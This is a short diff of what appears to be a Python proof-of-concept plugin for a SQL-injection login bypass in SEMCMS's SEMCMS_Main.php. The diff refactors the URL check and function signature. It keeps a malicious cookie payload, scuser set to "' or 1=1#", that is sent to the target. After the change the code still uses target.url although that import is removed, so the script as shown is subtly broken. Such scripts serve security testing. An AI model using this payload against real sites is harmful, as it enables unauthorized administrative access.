@@ -3,14 +3,13 @@ import urlparse
 
 import requests
 
-from lib.core.data import target
+from plugin.component.check import url_check
 
 
-def poc():
+def poc(url):
     try:
-        if not target.url.endswith("SEMCMS_Main.php"):
-            print("[*] Please make sure the url end with 'index.php'")
-            exit()
+        url_check(url, "SEMCMS_Main.php")
+
         evilcookie = {"scuser": "' or 1=1#"}
         r = requests.get(target.url, cookies=evilcookie)
 
